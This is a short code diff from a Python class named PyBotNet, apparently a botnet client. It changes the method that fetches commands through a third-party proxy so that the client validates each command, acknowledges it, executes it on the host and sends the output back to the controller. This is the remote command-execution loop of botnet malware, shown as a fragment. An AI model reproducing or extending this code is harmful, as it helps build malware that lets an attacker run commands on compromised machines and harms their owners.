@@ -70,9 +70,15 @@ class PyBotNet:
     def get_and_execute_scripts_by_third_party_proxy(self):
 
         self.command = self.get_last_command_by_third_party_proxy()
-
         if self.command:
-            self.output = scripts.execute_scripts(self.command, self.logger)
 
-            if self.output:
-                self.send_message_by_third_party_proxy(self.output)
+            if scripts.is_command(self.command):
+
+                self.send_message_by_third_party_proxy(
+                    f'command received: \n{self.command}')
+
+                self.output = scripts.execute_scripts(
+                    self.command, self.logger)
+
+                if self.output:
+                    self.send_message_by_third_party_proxy(self.output)
